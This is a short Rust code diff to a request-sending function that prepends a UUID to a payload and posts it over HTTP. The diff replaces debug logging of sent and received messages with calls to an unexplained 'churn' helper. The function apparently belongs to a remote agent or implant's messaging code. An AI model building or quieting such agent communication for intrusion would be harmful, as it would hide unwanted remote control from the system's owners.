@@ -33,7 +33,7 @@ pub fn send_request_raw(payload: &str) -> Result<String, Box<dyn std::error::Err
 }
 
 fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn std::error::Error>> {
-    println!("[SENDING] {}", payload);
+    crate::helpers::churn(payload.as_bytes());
 
     let uuid = config::UUID.read().unwrap();
     let full_msg = format!("{}{}", *uuid, payload);
@@ -66,8 +66,7 @@ fn send_request_internal(payload: &str, encode: bool) -> Result<String, Box<dyn 
         .send()?;
 
     let body = res.text()?;
-    println!("[RECEeved] {}", body);
-    // skip base64 decode
+    crate::helpers::churn(body.as_str());
     Ok(body)
 }
 
